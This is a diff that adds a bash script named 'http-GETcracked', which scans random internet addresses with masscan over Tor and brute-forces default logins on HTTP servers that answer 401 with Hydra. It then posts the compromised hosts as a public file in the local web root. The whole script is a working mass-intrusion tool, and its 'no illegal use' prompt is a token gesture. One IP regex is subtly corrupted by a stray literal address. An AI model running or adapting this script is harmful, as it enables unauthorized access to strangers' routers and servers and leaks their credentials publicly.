@@ -1,0 +1,187 @@
+#!/bin/bash
+banner=$(echo "http-GETcracked :: Random IP Masscan + Hydra :: By: MBHudson 2022")
+clear
+echo $banner
+echo ""
+echo ""
+echo "LOADING..."
+sudo rm HTTPgetCRACKED2.txt 2&> /dev/null
+sudo rm HTTPgetCRACKED1.txt 2&> /dev/null
+sudo rm HTTPgetCRACKED.txt 2&> /dev/null
+sudo rm newcracked.txt 2&> /dev/null
+sudo rm *.tmp1 2&> /dev/null
+clear
+echo $banner
+echo ""
+echo ""
+echo "LOADING..."
+echo ""
+echo ""
+echo "STARTING/RESTARTING Tor..."
+sudo service tor start 2&> /dev/null
+sudo service tor restart 2&> /dev/null
+sleep 2
+tor=$(proxychains4 -q curl ifconfig.io)
+clear
+echo "
+_  _ ___ ___ ___     ____ ____ ___   /   / ____ ____ ____ ____ _  _ ____ ___  
+|__|  |   |  |__] __ | __ |___  |   /   /  |    |__/ |__| |    |_/  |___ |  \ 
+|  |  |   |  |       |__] |___  |  /   /   |___ |  \ |  | |___ | \_ |___ |__/ 
+                                                                            |   "
+echo "____________________________________________________________________________|"
+echo "|       http-GETcracked :: Random IP Masscan + Hydra Password Cracker"                                                                                                                     
+echo "|                               ~version 1.7~"
+echo "|____> By: MBHudson 2022"
+banner=$(echo "http-GETcracked :: Random IP Masscan + Hydra :: By: MBHudson 2022")
+echo "                 ________________________________________"
+echo "                |                                        |"
+echo "                |                                        | "       
+echo "      --------------- YOUR TOR IP IS: $tor ---------------"         
+echo "                |                                        |"
+echo "                |________________________________________|"
+echo ""
+echo "  BY CONTINUING YOU ARE AGREEING NOT TO USE THIS SCRIPT FOR ILLEGAL PURPOSES"
+echo "If you agree to the above press [ENTER] otherwise hold the CRTL key and press C"
+echo ""
+read -p "Press [ENTER] only if you agree"
+clear
+sudo service apache2 start
+sudo touch newcracked.txt
+sudo touch HTTPgetIPs.tmp1
+sudo touch 401s.tmp1
+sudo touch 401IPs.tmp1
+sudo touch HTTPgetCRACKED.txt
+sudo touch banners.tmp1
+sudo touch HTTPgetIPs2.tmp1
+sudo touch HTTPgetCRACKED2.txt
+sudo touch HTTPgetCRACKED1.txt
+sudo touch HTTPgetIPs3.tmp1
+sudo touch SAVED_CRACKED
+clear
+echo $banner
+echo ""
+echo ""
+echo ""
+def_seconds=120
+echo "Example: 60 - for one minute. 120 - for two and so on..."
+read -p "ENTER SCAN DURATION IN SECONDS [Default:${def_seconds}]: " seconds
+seconds=${seconds:-${def_seconds}}
+clear
+echo $banner
+echo ""
+echo ""
+echo ""
+def_rate=9999
+echo "Example: 1000 - for one thousand packets per second."
+echo "This controls how fast the scanner goes through IP numbers"
+echo "!WARNING! This can easly burn up your internet interface device and/or hog all the available bandwith."
+read -p "ENTER SCAN RATE IN PPS [Default:${def_rate}]: " typed_rate
+typed_rate=${typed_rate:-${def_rate}}
+clear
+echo $banner
+echo ""
+echo ""
+echo ""
+def_iface=$(ip route get 8.8.8.8 | awk -- '{printf $5}')
+echo "This automaticaly attempts to detect the interface being used"
+echo "If you dont know just press [ENTER] but you can view all available interfaces by running the ifconfig command in another terminal"
+read -p "ENTER INTERNET INTERFACE TO USE: [Default:${def_iface}]: " typed_iface
+typed_iface=${typed_iface:-${def_iface}}
+clear
+echo $banner
+echo ""
+echo ""
+echo ""
+def_range=0.0.0.0/0
+echo "Example: 10.0.0.1/24 - 10.0.0.1-60 for local // 1.1.1.1-999.9.9.9.9 for remote // 0.0.0.0/0 for random remote IPs"
+read -p "ENTER SCAN RANGE: [Default:${def_range}]: " typed_range
+typed_range=${typed_range:-${def_range}}
+clear
+echo $banner
+echo ""
+echo ""
+echo ""
+def_port=80
+echo "Exapmle: 80 - 443 - 8080 - 8001 - 8080 - 8081"
+read -p "ENTER PORT TO SCAN: [Default:${def_port}]: " typed_port
+typed_port=${typed_port:-${def_port}}
+clear
+echo $banner
+echo ""
+echo ""
+proxychains4 -q sudo masscan -i $typed_iface -p$typed_port $typed_range --exclude 255.255.255.255 --rate=$typed_rate --banners --wait=3 -oG banners.tmp1 &
+sleep 2
+tail -F banners.tmp1 | grep -w "401" &
+clear
+echo $banner
+echo ""
+echo ""
+seconds=$seconds
+start="$(($(date +%s) + $seconds))"
+while [ "$start" -ge `date +%s` ]; do
+    time="$(( $start - `date +%s`))"
+    printf '%s\r' "$(date -u -d "@$time" +%H:%M:%S)"
+done
+sudo killall masscan
+sudo killall tail
+cat banners.tmp1 | grep -w "401" > 401s.tmp1 
+sudo grep -E -o '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)' 401s.tmp1 > 401IPs.tmp1 
+sudo awk '!seen[$0]++' 401IPs.tmp1 > HTTPgetIPs.tmp1
+sudo sort HTTPgetIPs.tmp1 | uniq -u
+clear
+echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+echo "PERFORMING A QUALITY CONTROL RUN, IPs THAT FAIL WILL BE REMOVED"
+sleep 3
+proxychains4 -q sudo hydra -M HTTPgetIPs.tmp1 -l admin -p 0000 http-get -s $typed_port -u -q -I -K -V -w 5 -o HTTPgetCRACKED1.txt
+echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+grep -E -o '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2218.35.222.29[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)' HTTPgetCRACKED1.txt > HTTPgetIPs2.tmp1
+sleep 2
+echo "**************************************************"
+echo "REMAINING IPs AFTER QUALITY CONTROL:"
+join -v1 -v2 <(sort HTTPgetIPs.tmp1) <(sort HTTPgetIPs2.tmp1) > HTTPgetIPs3.tmp1
+cat HTTPgetIPs3.tmp1
+echo "**************************************************"
+sleep 3
+proxychains4 -q sudo hydra -M HTTPgetIPs3.tmp1 -l root -p root http-get -s $typed_port -u -q -I -K -V -w 5 -o HTTPgetCRACKED2.txt 
+sudo service tor restart
+sleep 2
+proxychains4 -q sudo hydra -M HTTPgetIPs3.tmp1 -l Admin -p admin http-get -s $typed_port -u -q -I -K -V  -w 5-o HTTPgetCRACKED2.txt 
+sudo service tor restart
+sleep 2
+proxychains4 -q sudo hydra -M HTTPgetIPs3.tmp1 -l admin -p 123456 http-get -s $typed_port -u -q -I -K -V -w 5 -o HTTPgetCRACKED2.txt 
+sudo service tor restart
+sleep 2
+proxychains4 -q sudo hydra -M HTTPgetIPs3.tmp1 -l admin -p 1111 http-get -s $typed_port -u -q -I -K -V -w 5 -o HTTPgetCRACKED2.txt 
+sudo service tor restart
+sleep 2
+proxychains4 -q sudo hydra -M HTTPgetIPs3.tmp1 -l admin -p admin http-get -s $typed_port -u -q -I -K -V -w 5 -o HTTPgetCRACKED2.txt 
+sudo cat HTTPgetCRACKED2.txt | grep "host" >> newcracked.txt
+sudo sed -i 's|host: |http://|g' newcracked.txt
+echo "***************************************************"
+echo "NEWLY CRACKED....."
+echo "***************************************************" 
+cat newcracked.txt | grep "$typed_port"
+echo "***************************************************"
+echo "PREVIOUSLY CRACKED....."
+echo "***************************************************" 
+cat SAVED_CRACKED
+sudo cat newcracked.txt | grep "$typed_port" >> SAVED_CRACKED
+echo "***************************************************" 
+sudo rm /var/www/html/cracked.txt
+sudo cp SAVED_CRACKED /var/www/html/cracked.txt
+sudo chmod 777 /var/www/html/cracked.txt
+sudo service apache2 restart
+echo ""
+echo ""
+echo "CLEANING UP..."
+sudo rm HTTPgetCRACKED2.txt
+sudo rm HTTPgetCRACKED1.txt
+sudo rm HTTPgetCRACKED.txt
+sudo rm newcracked.txt
+sudo rm *.tmp1
+sleep 2
+echo ""
+echo ""
+echo ""
+echo ""
+echo "~FIN~"
